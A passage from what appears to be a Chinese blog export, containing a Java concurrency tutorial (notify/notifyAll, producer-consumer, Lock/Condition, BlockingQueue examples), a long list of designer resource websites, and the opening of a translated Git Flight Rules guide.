，所有任务都必须等待相同的条件，因为如果你有多个任务在等待不同的条件，那你就不会知道是否唤醒了恰当的任务。如果使用 notfiy(),当条件发生变化时，必须只有一个任务能从中收益。最后，这些限制对所有可能存在的子类都必须总起作用。如果这些规则任何一条不满足都必须使用 notifyAll()。在 Java 的线程机制中，有一个描述是这样的：notifyAll() 将唤醒所有正在等待的任务。这是否意味着在程序中任何地方，任何处于 wait() 状态中的任务都将被任何对 notifyAll() 的调用唤醒呢？在下面的实例中说明了情况并非如此，当 notifyAll() 因某个特定锁被调用时，只有等待这个锁的任务才会被唤醒： 12345678910111213141516171819public class Blocker &#123; synchronized void waitingCall() &#123; try &#123; while(!Thread.interrupted()) &#123; wait(); System.out.print(Thread.currentThread() + \" \"); &#125; &#125; catch(InterruptedException e) &#123; // OK to exit this way &#125; &#125; synchronized void prod() &#123; notify(); &#125; synchronized void prodAll() &#123; notifyAll(); &#125;&#125; 创建任务 Task: 1234public class Task implements Runnable &#123; static Blocker blocker = new Blocker(); public void run() &#123; blocker.waitingCall(); &#125;&#125; 创建任务 Task2: 12345public class Task2 implements Runnable &#123; // A separate Blocker object: static Blocker blocker = new Blocker(); public void run() &#123; blocker.waitingCall(); &#125;&#125; 测试类：123456789101112131415161718192021222324252627282930313233343536public class NotifyVsNotifyAll &#123; public static void main(String[] args) throws Exception&#123; ExecutorService service = Executors.newCachedThreadPool(); for (int i = 0; i &lt; 3; i++) &#123; service.execute(new Task()); &#125; service.execute(new Task2()); Timer timer = new Timer(); timer.scheduleAtFixedRate(new TimerTask() &#123; boolean prod = true; @Override public void run() &#123; // TODO Auto-generated method stub if (prod) &#123; System.out.println(\"notify\"); Task.blocker.prod(); prod = false; &#125;else &#123; System.out.println(\"notifyAll\"); Task.blocker.prodAll(); prod = true; &#125; &#125; &#125;, 400, 400); TimeUnit.SECONDS.sleep(5); timer.cancel(); System.out.println(\"Time cancle\"); TimeUnit.MILLISECONDS.sleep(500); System.out.println(\"Task2.blocker.prodAll() \"); Task2.blocker.prodAll(); TimeUnit.MILLISECONDS.sleep(500); System.out.println(\"\\nShutting down\"); service.shutdownNow(); // Interrupt all tasks &#125;&#125; 测试结果：12345678910111213141516notifyThread[pool-1-thread-2,5,main] notifyAllThread[pool-1-thread-2,5,main] Thread[pool-1-thread-3,5,main] Thread[pool-1-thread-1,5,main] notifyThread[pool-1-thread-2,5,main] notifyAllThread[pool-1-thread-2,5,main] Thread[pool-1-thread-1,5,main] Thread[pool-1-thread-3,5,main] notifyThread[pool-1-thread-2,5,main] notifyAllThread[pool-1-thread-2,5,main] Thread[pool-1-thread-3,5,main] Thread[pool-1-thread-1,5,main] notifyThread[pool-1-thread-2,5,main] notifyAllThread[pool-1-thread-2,5,main] Thread[pool-1-thread-1,5,main] Thread[pool-1-thread-3,5,main] notifyThread[pool-1-thread-2,5,main] notifyAllThread[pool-1-thread-2,5,main] Thread[pool-1-thread-3,5,main] Thread[pool-1-thread-1,5,main] notifyThread[pool-1-thread-2,5,main] notifyAllThread[pool-1-thread-2,5,main] Thread[pool-1-thread-1,5,main] Thread[pool-1-thread-3,5,main] Time cancleTask2.blocker.prodAll()Thread[pool-1-thread-4,5,main]Shutting down 从上面输出的结果可以看出，我们启动了三个 Task 任务线程，一个 Task2 线程。使用 timer 做了一个定时器，每间隔 4 毫秒就轮换启动 Task.blocker 的 notify() 和 notifyAll()方法。我们看到 Task 和 Task2 都有 Blocker 对象，他们调用 Blocker 对象的时候都会被阻塞。我们看到当调用 Task.prod() 的时候只有一个在等待锁的任务被唤醒，其余两个继续挂起。当调用 Task.prodAll() 的时候等待的三个线程都会被唤醒。当调用 Task2。prodAll() 的时候 只有 Task2 的线程任务被唤醒。其余的三个 Task 任务继续挂起。 生产者与消费者请考虑这样一种情况，在饭店有一个厨师和一个服务员。这个服务员必须等待厨师做好膳食。当厨师准备好时会通知服务员，之后服务员上菜，然后返回继续等待。这是一个任务协作示例：厨师代表生产者，而服务员代表消费者。两个任务必须在膳食被生产和消费时进行握手，而系统必须是以有序的方式关闭。膳食类： 12345public class Meal &#123; private final int orderNum; public Meal(int orderNum) &#123; this.orderNum = orderNum; &#125; public String toString() &#123; return \"Meal \" + orderNum; &#125;&#125; 服务生类：123456789101112131415161718192021222324public class WaitPerson implements Runnable &#123; private Restaurant restaurant; public WaitPerson(Restaurant r) &#123; restaurant = r; &#125; public void run() &#123; try &#123; while(!Thread.interrupted()) &#123; synchronized(this) &#123; while(restaurant.meal == null) wait(); // ... for the chef to produce a meal &#125; Print.print(\"Waitperson got \" + restaurant.meal); synchronized(restaurant.chef) &#123; restaurant.meal = null; restaurant.chef.notifyAll(); // Ready for another &#125; &#125; &#125; catch(InterruptedException e) &#123; Print.print(\"WaitPerson interrupted\"); &#125; &#125;&#125; 厨师类： 1234567891011121314151617181920212223242526272829public class Chef implements Runnable &#123; private Restaurant restaurant; private int count = 0; public Chef(Restaurant r) &#123; restaurant = r; &#125; public void run() &#123; try &#123; while(!Thread.interrupted()) &#123; synchronized(this) &#123; while(restaurant.meal != null) wait(); // ... for the meal to be taken &#125; if(++count == 10) &#123; Print.print(\"Out of food, closing\"); restaurant.exec.shutdownNow(); &#125; Print.printnb(\"Order up! \"); synchronized(restaurant.waitPerson) &#123; restaurant.meal = new Meal(count); restaurant.waitPerson.notifyAll(); &#125; TimeUnit.MILLISECONDS.sleep(100); &#125; &#125; catch(InterruptedException e) &#123; Print.print(\"Chef interrupted\"); &#125; &#125;&#125; 测试类： 12345678910111213public class Restaurant &#123; Meal meal; ExecutorService exec = Executors.newCachedThreadPool(); WaitPerson waitPerson = new WaitPerson(this); Chef chef = new Chef(this); public Restaurant() &#123; exec.execute(chef); exec.execute(waitPerson); &#125; public static void main(String[] args) &#123; new Restaurant(); &#125;&#125; 执行结果： 123456789101112Order up! Waitperson got Meal 1Order up! Waitperson got Meal 2Order up! Waitperson got Meal 3Order up! Waitperson got Meal 4Order up! Waitperson got Meal 5Order up! Waitperson got Meal 6Order up! Waitperson got Meal 7Order up! Waitperson got Meal 8Order up! Waitperson got Meal 9Out of food, closingOrder up! WaitPerson interruptedChef interrupted 使用显示的 Lock 和 Condition 对象 在 java SE5 的类库中还有额外的显示工具。我们来重写我们的打蜡和抛光类。使用互斥并允许任务挂起的基本类是 Condition，你可以通过在 Condition 上调用 await() 来挂起一个任务。当外部条件发生变化时，意味着某个任务应该继续执行，你可以通过调用 signal() 来通知这个任务，从而唤醒一个任务，或者调用 signalAll() 来唤醒所有在这个 Condition 上被挂起的任务。(signalAll() 比 notifAll() 是更安全的方式) 下面是重写版本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788class Car &#123; private Lock lock = new ReentrantLock(); private Condition condition = lock.newCondition(); private boolean waxOn = false; public void waxed() &#123; lock.lock(); try &#123; waxOn = true; // Ready to buff condition.signalAll(); &#125; finally &#123; lock.unlock(); &#125; &#125; public void buffed() &#123; lock.lock(); try &#123; waxOn = false; // Ready for another coat of wax condition.signalAll(); &#125; finally &#123; lock.unlock(); &#125; &#125; public void waitForWaxing() throws InterruptedException &#123; lock.lock(); try &#123; while(waxOn == false) condition.await(); &#125; finally &#123; lock.unlock(); &#125; &#125; public void waitForBuffing() throws InterruptedException&#123; lock.lock(); try &#123; while(waxOn == true) condition.await(); &#125; finally &#123; lock.unlock(); &#125; &#125;&#125;class WaxOn implements Runnable &#123; private Car car; public WaxOn(Car c) &#123; car = c; &#125; public void run() &#123; try &#123; while(!Thread.interrupted()) &#123; printnb(\"Wax On! \"); TimeUnit.MILLISECONDS.sleep(200); car.waxed(); car.waitForBuffing(); &#125; &#125; catch(InterruptedException e) &#123; print(\"Exiting via interrupt\"); &#125; print(\"Ending Wax On task\"); &#125;&#125;class WaxOff implements Runnable &#123; private Car car; public WaxOff(Car c) &#123; car = c; &#125; public void run() &#123; try &#123; while(!Thread.interrupted()) &#123; car.waitForWaxing(); printnb(\"Wax Off! \"); TimeUnit.MILLISECONDS.sleep(200); car.buffed(); &#125; &#125; catch(InterruptedException e) &#123; print(\"Exiting via interrupt\"); &#125; print(\"Ending Wax Off task\"); &#125;&#125;public class WaxOMatic2 &#123; public static void main(String[] args) throws Exception &#123; Car car = new Car(); ExecutorService exec = Executors.newCachedThreadPool(); exec.execute(new WaxOff(car)); exec.execute(new WaxOn(car)); TimeUnit.SECONDS.sleep(5); exec.shutdownNow(); &#125;&#125; 在 Car 的构造器中单个的 Lock 将产生一个 Condition 对象，这个对象被用来管理任务之间的通信。但是这个 Condition 不包含任何有关处理状态的信息，因此你需要额外的表示处理状态的信息，即 Boolean waxOn。 生产者消费者与队列wait() 和 notifAll() 方法以一种非常低级的方式解决了任务的互操作的问题，即每次交互时都握手。许多时候我们可以使用同步队列来解决协作的问题，同步队列在任何时刻只允许一个任务插入或移除元素。在 Java.util.concurrent.BlockingQueue 接口中提供了这个队列，这个接口有大量的标准实现。可以使用 LinkedBlockingQueue 他是一个无界队列，还可以使用 ArrayBlockingQueue，它具有固定的尺寸，可以在它被阻塞之前向其中放置有限数量的元素。 如果消费者任务试图从队列中获取对象，而该队列为空时，那么这些队列就可以挂起这些任务，并且当有更多的元素可用时恢复这些消费任务。阻塞队列可以解决非常大的问题，而其方式与 wait() 和 notifyAll() 相比，则简单切可靠。 下面是一个简单的测试，它将多个 LiftOff 对象执行串行化。消费者 LiftOffRunner 将每个 LiftOff 对象从 BlockIngQueue 中推出并直接运行。它通过显示的调用 run() 而是用自己的线程来运行，而不是为每个任务启动一个线程。 首先把之前写过的 LiftOff 类贴出来： 1234567891011121314151617181920public class LiftOff implements Runnable&#123; protected int countDown = 10; // Default private static int taskCount = 0; private final int id = taskCount++; public LiftOff() &#123;&#125; public LiftOff(int countDown) &#123; this.countDown = countDown; &#125; public String status() &#123; return \"#\" + id + \"(\" + (countDown &gt; 0 ? countDown : \"Liftoff!\") + \"), \"; &#125; public void run() &#123; while(countDown-- &gt; 0) &#123; System.out.print(status()); Thread.yield(); &#125; &#125;&#125; LiftOffRunner 类： 1234567891011121314151617181920212223242526272829303132public class LiftOffRunner implements Runnable&#123; private BlockingQueue&lt;LiftOff&gt; rockets; protected LiftOffRunner(BlockingQueue&lt;LiftOff&gt; rockets) &#123; super(); this.rockets = rockets; &#125; public void add(LiftOff lo) &#123; try &#123; rockets.put(lo); &#125; catch (InterruptedException e) &#123; // TODO Auto-generated catch block System.out.println(\"添加失败\"); &#125; &#125; @Override public void run() &#123; // TODO Auto-generated method stub try &#123; while (!Thread.interrupted()) &#123; LiftOff rocket = rockets.take(); rocket.run(); &#125; &#125; catch (InterruptedException e) &#123; // TODO Auto-generated catch block System.out.println(\"运行中断\"); &#125; System.out.println(\"退出运行\"); &#125;&#125; 最后是测试类： 12345678910111213141516171819202122232425262728293031323334public class TestBlockingQueues &#123; static void getkey()&#123; try &#123; new BufferedReader(new InputStreamReader(System.in)).readLine(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; static void getkey(String message) &#123; Print.print(message); getkey(); &#125; static void test(String msg,BlockingQueue&lt;LiftOff&gt; queue)&#123; LiftOffRunner runner = new LiftOffRunner(queue); Thread thread = new Thread(runner); thread.start(); //启动了，但是内容是空的，就一直挂起，等待有新的内容进去 for (int i = 0; i &lt; 5; i++) &#123; runner.add(new LiftOff(5)); &#125; getkey(\"Press Enter \"+ msg); thread.interrupt(); &#125; public static void main(String[] args) &#123; test(\"LinkedBlockingQueue\", new LinkedBlockingQueue&lt;LiftOff&gt;()); test(\"ArrayBlockingQueue\", new ArrayBlockingQueue&lt;&gt;(3)); test(\"SynchronousQueue\", new SynchronousQueue&lt;&gt;()); &#125;&#125; 吐司 BlockingQueue 下面是一个示例，每一台机器都有三个任务：一个只做吐司、一个给吐司抹黄油、另一个在涂抹黄油的吐司上抹果酱。我们来示例如果使用 BlockIngQueue 来运行这个示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127class Toast &#123; public enum Status &#123; DRY, BUTTERED, JAMMED &#125; private Status status = Status.DRY; private final int id; public Toast(int idn) &#123; id = idn; &#125; public void butter() &#123; status = Status.BUTTERED; &#125; public void jam() &#123; status = Status.JAMMED; &#125; public Status getStatus() &#123; return status; &#125; public int getId() &#123; return id; &#125; public String toString() &#123; return \"Toast \" + id + \": \" + status; &#125;&#125;class ToastQueue extends LinkedBlockingQueue&lt;Toast&gt; &#123;&#125;class Toaster implements Runnable &#123; private ToastQueue toastQueue; private int count = 0; private Random rand = new Random(47); public Toaster(ToastQueue tq) &#123; toastQueue = tq; &#125; public void run() &#123; try &#123; while(!Thread.interrupted()) &#123; TimeUnit.MILLISECONDS.sleep( 100 + rand.nextInt(500)); // Make toast Toast t = new Toast(count++); print(t); // Insert into queue toastQueue.put(t); &#125; &#125; catch(InterruptedException e) &#123; print(\"Toaster interrupted\"); &#125; print(\"Toaster off\"); &#125;&#125;// Apply butter to toast:class Butterer implements Runnable &#123; private ToastQueue dryQueue, butteredQueue; public Butterer(ToastQueue dry, ToastQueue buttered) &#123; dryQueue = dry; butteredQueue = buttered; &#125; public void run() &#123; try &#123; while(!Thread.interrupted()) &#123; // Blocks until next piece of toast is available: Toast t = dryQueue.take(); t.butter(); print(t); butteredQueue.put(t); &#125; &#125; catch(InterruptedException e) &#123; print(\"Butterer interrupted\"); &#125; print(\"Butterer off\"); &#125;&#125;// Apply jam to buttered toast:class Jammer implements Runnable &#123; private ToastQueue butteredQueue, finishedQueue; public Jammer(ToastQueue buttered, ToastQueue finished) &#123; butteredQueue = buttered; finishedQueue = finished; &#125; public void run() &#123; try &#123; while(!Thread.interrupted()) &#123; // Blocks until next piece of toast is available: Toast t = butteredQueue.take(); t.jam(); print(t); finishedQueue.put(t); &#125; &#125; catch(InterruptedException e) &#123; print(\"Jammer interrupted\"); &#125; print(\"Jammer off\"); &#125;&#125;// Consume the toast:class Eater implements Runnable &#123; private ToastQueue finishedQueue; private int counter = 0; public Eater(ToastQueue finished) &#123; finishedQueue = finished; &#125; public void run() &#123; try &#123; while(!Thread.interrupted()) &#123; // Blocks until next piece of toast is available: Toast t = finishedQueue.take(); // Verify that the toast is coming in order, // and that all pieces are getting jammed: if(t.getId() != counter++ || t.getStatus() != Toast.Status.JAMMED) &#123; print(\"&gt;&gt;&gt;&gt; Error: \" + t); System.exit(1); &#125; else print(\"Chomp! \" + t); &#125; &#125; catch(InterruptedException e) &#123; print(\"Eater interrupted\"); &#125; print(\"Eater off\"); &#125;&#125;public class ToastOMatic &#123; public static void main(String[] args) throws Exception &#123; ToastQueue dryQueue = new ToastQueue(), butteredQueue = new ToastQueue(), finishedQueue = new ToastQueue(); ExecutorService exec = Executors.newCachedThreadPool(); exec.execute(new Toaster(dryQueue)); exec.execute(new Butterer(dryQueue, butteredQueue)); exec.execute(new Jammer(butteredQueue, finishedQueue)); exec.execute(new Eater(finishedQueue)); TimeUnit.SECONDS.sleep(5); exec.shutdownNow(); &#125;&#125; 这个示例中没有任何显示的同步，因为同步队列和系统的设计隐式的管理了每片 Toast 在任何时刻都只有一个任务在操作。因为队列的阻塞，使得处理过程将被自动挂起和恢复。","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"设计师资源","slug":"前端/设计师资源","date":"2017-12-28T01:54:53.000Z","updated":"2021-12-28T03:24:10.266Z","comments":true,"path":"前端/设计师资源/","link":"","permalink":"http://yoursite.com/前端/设计师资源/","excerpt":"","text":"注意：本文来自awesome，点击阅读原文 ICON图标 Fontello：图标字体生成器 The Noun Project：免费提供高度可辨识符号图标 IconArchive：专业图标搜索引擎 iConify：Mac平台的苹果应用图标自动化生成工具 Iconbench：在线ICON素材图标制作工具 EasyIcon：免费图标搜索和下载平台 Icon Deposit：一个奇妙的图标下载站 Logo 设计 Logaster：教你在线几分钟内搞定专业的LOGO设计 LogoLounge：国际知名的LOGO设计权威网站 LogoMoose：一个优秀的logo素材站点 LogoPond：LOGO设计作品收藏网 BRAND NEW：资源丰富的Logo设计网站 LOGOED：一个展示Logo设计的博客 LOGOSPIRE：logo设计的交流平台 Logo of the Day：汇集世界各地优秀LOGO作品的站点 LogoDesignLove：Logo设计技巧分享网 Brandseen：匹配流行品牌LOGO颜色的在线游戏 Photoshop插件 Retinize：iOS切图神器 GuideGuide：一款PS参考线插件 Divine Proportions Toolkit：黄金分割工具 Kockout：PS抠图神器 Coolors：自动生成配色色板的小工具 Assistor PS：一个功能强大的PS辅助工具 Flexify 2：PS变形滤镜插件 DevRocket：一款iOS UI设计效率工具 Slicy：Mac下的切图神器 Kuler：Adobe的配色工具 交互设计工具 VXPLO：专业的HTML5编辑工具 Epub360：专业级H5交互设计工具 Indigo Studio：UI原型设计和交互设计工具 Avocado：无需编码的跟设计原型进行交互 Webflow：傻瓜式网页设计制作平台 Marvel：更专注交互动作的在线工具 Principle：Mac平台交互动效设计神器 Quartz Composer：图形化的编程工具 Form：交互原型设计工具 Pixate：设计师的免费动效神器 Framer.js：一个交互原型设计框架 Keynote：快速制作高保真交互原型 ORIGAMI：交互神器-图像设计动画合成工具 InVision：便捷的产品原型生成工具 流程图/脑图 ProcessOn：免费的在线作图、实时协作工具 DrawAnywhere：在线流程图制作工具 Lovely Charts：功能强大的在线图表制作工具 Creately：优秀的绘制产品图形的在线工具 Cacoo：在线简单易用的网络画图工具 LucidChart：在线流程图绘制和协作应用平台 Gliffy：在线免费流程图制作工具 NovaMind：非常优秀的思维导图软件 MindMapper：专业的可视化脑图管理工具 FreeMind：免费的思维导图软件 XMind：非常实用的商业思维导图软件 MindManager：专业思维导图工具 百度脑图：便捷的思维编辑工具 灵感酷站 Sketchrepo：免费高品质的Sketch资源 Psdrepo：免费高品质的PSD资源 1X：一个优秀的摄影作品网站 Magdeleine：免费高清灵感图片网 We Heart It：每天发现充满灵感且美丽的图片 PinSpire：灵感创意作品收集平台 NotCot：一个集视觉效果、美学为一体的网站 9GAG：全球最搞笑的趣图网站 BoooooooM：设计简约但内容丰富的博客 illusion：展示最惊人的创意图片 Baubauhaus：提供设计灵感、插画摄影等艺术作品 Niice：设计师必备的灵感搜索引擎 DeviantArt：最大的艺术和设计社区 花瓣网：设计师寻找灵感的天堂 pixiv：日本同人画、插画作品分享站点 Awwwards：最佳网页设计展示平台 WallHaven：高清壁纸图片搜索引擎 Pinterest：图片分享类的社交网站 Abduzeedo：一家集创意灵感和教程的设计博客 Yanko Design：最棒的现代工业设计站点 SwissMiss：分享创意设计的网站 PetaPixel：专业的摄影爱好者点评博客 365PSD：免费psd图片素材下载网站 Typophile：字体设计艺术网站 Patterntap：适合用户界面设计和图案感兴趣的同学 Designshack：设计作品欣赏网站 Behance：全球领先的专业创意平台 Dribbble：设计师必备网站之一 FFFFound：专业的图片收藏网 MyModernmet：众多艺术家不可或缺的信息来源 Grain Edit：复古和古典风格的设计内容 UIparade：灵感UI设计作品分享网站 Muuuuu：日本网站画廊，收集最具创意网站 iKesai：网页设计作品案例库 CSS Winner：网站设计资源站点 线框图/原型图 Prott：移动测试原型制作工具 Solidify：一款原型制作软件 ProcessOn：免费的在线作图、实时协作工具 Mockingbird：一个基于 Web 的在线原型设计平台 Creately：优秀的绘制产品图形的在线工具 Cacoo：在线简单易用的网络画图工具 Gliffy：在线免费流程图制作工具 Indigo Studio：UI原型设计和交互设计工具 墨刀MockingBot：免费的移动应用原型与线框图工具 Marvel：更专注交互动作的在线工具 Keynote：快速制作高保真交互原型 OmniGraffle：Mac平台下最好的原型设计工具 Handmade Sketches：手工草图绘制工具 Mockups.me：ui线框图软件 Live wire：iPad上的线框图制作工具 UXToolbox：Window平台的线框图工具 DevRocket：一款iOS UI设计效率工具 AppCooker：从图标草图到原型设计的iPad应用 Blueprint：你轻而易举地设计原型的iPad应用 Mockplus摩客：简洁高效的原型图设计工具 Pencil Project：制作图表和GUI原型的工具 iPlotz：用来创建可点击、可导航的原型和线框图工具 Mokk.me：一个简单快速的原型工具 InVision：便捷的产品原型生成工具 HotGloo：功能强大的产品原型在线工具 iPhone Mockup：非常简单的在线原型工具 FlairBuilder：用来创建交互性线框图的快速原型工具 Pidoco：一款基于Web的原型设计软件 Omnigraffle：用来快速绘制线框图、图表、流程图等 WireframeSketcher：灵活的线框图和原型快速创作工具 Protoshare：十分便捷的在线原型制作工具 MockFlow：制作产品原型的在线工具 Balsamiq Mockups：基于Flash的快速制作线框图工具 Proto.io：一个专用的手机原型开发平台 Axure RP：专业的快速原型设计工具 Wireframe.cc：在线线框图绘制工具 PowerMockup ：把微软的PPT文件直接变成线框图工具 UXPin：实体模型和在线可点击原型创作工具 Fluid UI：用于移动开发的Web原型设计工具 Mockup：在线线框图工具 justinmind：产品原型设计工具 设计博客 BoooooooM：设计简约但内容丰富的博客 LOGOED：一个展示Logo设计的博客 Abduzeedo：一家集创意灵感和教程的设计博客 SwissMiss：分享创意设计的网站 The Industry：学习平面设计的极佳出版物 Net Magazine：文章覆盖面广，适合扩宽眼界 Web Designer Depot：适合视觉设计人员专注 Design Modo：偏于设计前沿和设计趋势的博客 Lukew：干货文章分享，资深的用户体验专家 UX Magazine：善于用通俗的案例讲解理论知识 UXbooth：专注于用户体验设计文章 Smashing Magazine：整体质量很高的设计文章 The Great Discontent：提供世界顶尖创意者的漫长访谈 设计工具 One% CSS Grid：一款基于百分比的CSS响应式框架 Simple Grid：轻量级的响应式 CSS 网格系统 Iconify：一个作品网站平台 iConify：Mac平台的苹果应用图标自动化生成工具 Viewport Resizer：一个测试响应式设计的小书签 Divshot：在线的可视化网页设计工具 Bootply：一款很棒的 Bootstrap UI 编辑工具 Jetstrap：Bootstrap框架的可视化制作工具 Layoutit：在线搭建Bootstrap响应式布局的工具 Bonsai：一套轻量级的JavaScript绘图库 Bootsnipp：针对Web设计师和开发者的前端元素库 SimplyTestable：一款自动的前端网页测试工具 Onlytasks：支持双向同步的Evernote效率工具 rwdgrid：基于960grid的响应式网格系统 Iconbench：在线ICON素材图标制作工具 Photo Raster：在线免费图片编辑美化工具 Manymo：在线安卓系统模拟器工具 Sellbox：可以通过Dropbox账户售卖你的数字文档 RightFont：超好用的字体管理工具 Wobzip：提供在线解压缩文件的网站 Archive.Today：一个网页快照捕捉工具 Minigrid：简约漂亮的网页布局栅格系统 Background Burner：简单的在线抠图工具 CloudConvert：在线免费的万能文件格式转换器 Lovely Charts：功能强大的在线图表制作工具 Cacoo：在线简单易用的网络画图工具 Incogna：相似图片搜索引擎 Picitup：在线相似图片搜索引擎 PinCap：图片资源收集管理工具 TinEye：以图搜图的反向图片搜索引擎 Giphy：专搜GIF动态图的搜索引擎 LibreStock：一站搜寻二十个常用的图库网站 Assistor PS：一个功能强大的PS辅助工具 PaintCode：矢量图设计工具 Macaw：富有超前性和前瞻性的Web设计工具 Jimdo：在线网页自助建站平台 Ceilfire：一个创建HTML5游戏并分享的平台 Weebly：快速搭建免费网站、博客和网店 Google Web Designer：可视化HTML5网页和广告设计开发工具 Wix：基于html5的免费网站生成应用 VXPLO：专业的HTML5编辑工具 易企秀：H5页面移动微场景应用制作工具 兔展：微信场景应用的在线制作工具 Liveapp：移动场景应用平台 MAKA：简单、强大的H5创作工具 初页：微信H5海报创作工具 白板：设计图多人实时讨论工具 Ulead Cool 360：一个全景图片生成器 Red pen：设计图实时讨论工具 Coolsite360：无需编程的响应式网站设计工具 Epub360：专业级H5交互设计工具 皮影客：三分钟做部动画片 Webflow：傻瓜式网页设计制作平台 Quartz Composer：图形化的编程工具 After Effects：一款图形视频处理软件 Hype 3：帮助不会编程的用户轻松创建 HTML 5 Dorado：一款方便灵活的标注工具 WhatFontIs：在线图片字体识别工具 在线认字体：看图识字的求字体网 MarkMan马克鳗：高效的设计稿标注、测量工具 Skala Preview：iOS UI 设计师必备 Briefs：专业APP设计工具 Placeit：在线预览APP界面设计效果图的模板工具 UI Parde：在线UI设计工具 CSS Content Filter：易于定制、便于集成的CSS内容过滤工具 TinyCon：用于管理Favicon和弹出框 Gitup：为Git所准备的图形化客户端 Unsplash：用于网页中的图片占位符 Now UI Kit：用于网页设计、平板和手机的界面 Timber：一款前端框架工具 Grid.Guide：计算栅格宽度的工具 Apostrophe：一款设计驱动下的内容管理系统 Bonsai：一款为自由设计师所准备的工具 GridLayout：一款轻量级的栅格系统 Rucksack：一款有趣的CSS工具 Flarum：一套简约易用的开源论坛系统 Lightning Design Systems：专注于构建体验优秀的企业级APP Frontify：维护品牌风格和样式的在线工具 TinyPng：在线PNG图片压缩工具 Kendo UI : jQuery HTML5 UI组件框架 AdobeEdgeWebFonts：Adobe免费Web字体 Sizecalc：字体大小计算器 Inkpad：iPad 矢量插图应用 设计教程 SlideRule：在线免费课程搜索平台 Abduzeedo：一家集创意灵感和教程的设计博客 HackDesign：黑客设计教学网 Lukew：干货文章分享，资深的用户体验专家 UX Magazine：善于用通俗的案例讲解理论知识 UXbooth：专注于用户体验设计文章 Smashing Magazine：整体质量很高的设计文章 The Great Discontent：提供世界顶尖创意者的漫长访谈 Information Aesthetics：学习信息图设计和布局的网站 about tech：数字排版开放课程 AIGA：专业的设计理论文章 Design Tutsplus：专业设计教程网 设计素材 Freepik：免费的素材搜索引擎 RBNo2.1：是简化版的非衬线字体 Moki：从七种不同的风格演变而来的字体 King Wood Volume：带有Tuscan的哥特式风格的字体 Window Dressing JNL：线条干净、简洁的字体 Zombie Sunrise：一款手绘设计的字体 Toolkit：一款免费的怀旧感字体 Poly：一款基于几何排列的免费显示字体 Eaglefeather：由P22 Type Foundry调整而来的字体 Hummingbird：一款既怀旧复古又有科技感的字体 Rosarian：一款书法字体 Sketchrepo：免费高品质的Sketch资源 Psdrepo：免费高品质的PSD资源 The Pattern Library：免费纹理素材资源网 PicJumbo：在线免费高质量素材网 Material UI Colors：为Material Design而生的配色模板 Design Kindle：免费网页UI设计素材下载站 DeviantArt：最大的艺术和设计社区 花瓣网：设计师寻找灵感的天堂 365PSD：免费psd图片素材下载网站 配色方案 Spectrum：色彩搭配、图片取色器工具 Coolors：自动生成配色色板的小工具 Material Palette：Material Design专用在线配色工具 Material UI Colors：为Material Design而生的配色模板 Web安全色：WEB设计、开发中常用的安全颜色 Color Hunter：一个十分酷炫的配色网站 配色网：国内的非盈利配色素材网站 Nippon colors：日本传统用色色谱网站 Colorotate：独特创意的设计调色板 ColorZilla：火狐浏览器网页取色器插件 Contrast-A：非常专业的调色板配置工具 Adobe Color CC：Adobe取色器 Kuler：Adobe的配色工具 Color Palette Generator：图片配色工具 Color Scheme Designer：免费网络调色工具 Color Hunt：漂亮炫酷的配色方案 Brandseen：匹配流行品牌LOGO颜色的在线游戏 高清图库 PhotoPin：基于Flickr图片资源搜索引擎 SplitShire：免费高清摄影图片下载 Free Refe Mobile Photos：主要提供免费的手机图片 Photo Raster：在线免费图片编辑美化工具 Stock Up：一次查找21个免费可商用图库网站 Wallpaperswide：精品壁纸下载站 Socwall：高清壁纸下载站 flickr：雅虎旗下图片分享网站 500px：一个专业摄影师图片社区 1X：一个优秀的摄影作品网站 Jaymantri：免费高清摄影图片网 Picography：免费高清摄影图片分享网 FoodiesFeed：免费食品图片下载网站 Magdeleine：免费高清灵感图片网 Raumrot：免费高分辨率无版权图片网 FreeImages：免费商业图片素材网 LifeOfPix：免费欧美生活图片网 Incogna：相似图片搜索引擎 Picitup：在线相似图片搜索引擎 We Heart It：每天发现充满灵感且美丽的图片 illusion：展示最惊人的创意图片 VisualizeUs：一个图片收藏网站 PinCap：图片资源收集管理工具 TinEye：以图搜图的反向图片搜索引擎 Giphy：专搜GIF动态图的搜索引擎 LibreStock：一站搜寻二十个常用的图库网站 IM Free：免费高清图片库 The Pattern Library：免费纹理素材资源网 PicJumbo：在线免费高质量素材网 Design Kindle：免费网页UI设计素材下载站 花瓣网：设计师寻找灵感的天堂 WallHaven：高清壁纸图片搜索引擎 Snapographic：免费高清照片订阅网 Twnsnd：免费复古照片公共档案库 GIRLY DROP：高清美女图片素材站 Foter：免费图片素材搜索引擎 DesignersPics：免费高清图片资源 Pexels：免费高品质图片 可商用 Gratisography：定期发布高品质的免费照片 Function：优秀的图片网站 Pixabay：内容丰富的摄影照片网站 Death To The Stock Photo：高品质的照片网站 DotSpin：漂亮的图片素材网站 New Old Stock：一个有趣的复古照片网站 Superfamous：免费高质量图片素材 Little Visuals：免费高质量图片素材 Unsplash： 高品质免费图片素材库","categories":[],"tags":[]},{"title":"Git飞行规则(Flight Rules)","slug":"git/Git飞行规则(Flight-Rules)","date":"2017-12-17T01:52:36.000Z","updated":"2021-12-28T03:24:10.235Z","comments":true,"path":"git/Git飞行规则(Flight-Rules)/","link":"","permalink":"http://yoursite.com/git/Git飞行规则(Flight-Rules)/","excerpt":"","text":"原文 ：https://github.com/k88hudson/git-flight-rules/blob/master/README_zh-cn.md 前言 英文原版README 翻译可能存在错误或不标准的地方，欢迎大家指正和修改，谢谢！ 什么是”飞行规则”?一个 宇航员指南 (现在, 程序员们都在使用GIT) 是关于出现问题过后应该怎么操作。 飞行规则(Flight Rules) 是记录在手册上的来之不易的一系列知识，记录了某个事情发生的原因，以及怎样一步一步的进行处理。本质上, 它们是特定场景的非常详细的标准处理流程。 […] 自20世纪60年代初以来，NASA一直在捕捉(capturing)我们的失误，灾难和解决方案, 当时水星时代(Mercury-era)的地面小组首先开始将“经验教训”收集到一个纲要(compendium)中，该纲现在已经有上千个问题情景，从发动机故障到破损的舱口把手到计算机故障，以及它们对应的解决方案。 &mdash; Chris Hadfield, 一个宇航员的生活指南(An Astronaut’s Guide to Life)。 